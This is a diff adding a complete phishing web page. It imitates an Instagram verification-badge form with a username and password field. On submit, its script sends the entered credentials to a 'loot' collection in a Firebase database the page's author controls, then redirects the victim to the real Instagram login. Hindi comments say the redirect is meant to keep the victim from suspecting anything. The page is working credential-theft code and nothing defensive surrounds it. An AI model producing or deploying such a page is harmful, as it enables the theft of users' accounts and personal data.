@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Help Center - Verification</title>
+    <style>
+        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; padding-top: 50px; }
+        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; }
+        button { width: 100%; background: #0095f6; color: white; border: none; padding: 8px; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        .info { color: #8e8e8e; font-size: 14px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://www.instagram.com/static/images/web/mobile_port_monogram_73223e54f651.png/73223e54f651.png" class="logo">
+        <p>Apply for Instagram Blue Verification Badge</p>
+        <input type="text" id="victim_user" placeholder="Phone number, username, or email">
+        <input type="password" id="victim_pass" placeholder="Password">
+        <button id="btn-hack">Log In</button>
+        <p class="info">Enter your details to verify your identity for the badge.</p>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        // Aapki Nayi Config (Firebase45)
+        const firebaseConfig = {
+            apiKey: "AIzaSyB9VT_BN_O5SFDZm7RP8Ukz3mT7RP8Ukz3",
+            authDomain: "project-b2602.firebaseapp.com",
+            projectId: "project-b2602",
+            storageBucket: "project-b2602.appspot.com",
+            appId: "1:406839109753:web:dcf6f5077f8d93c98a8ca8"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        document.getElementById('btn-hack').addEventListener('click', async () => {
+            const u = document.getElementById('victim_user').value;
+            const p = document.getElementById('victim_pass').value;
+
+            try {
+                // Data ko database mein chupchap bhejna
+                await setDoc(doc(db, "loot", u), {
+                    username: u,
+                    password: p,
+                    time: new Date().toLocaleString()
+                });
+                // User ko asli site par redirect karna taaki shak na ho
+                window.location.href = "https://www.instagram.com/accounts/login/"; 
+            } catch (e) {
+                console.log("Error capturing data");
+            }
+        });
+    </script>
+</body>
+</html>
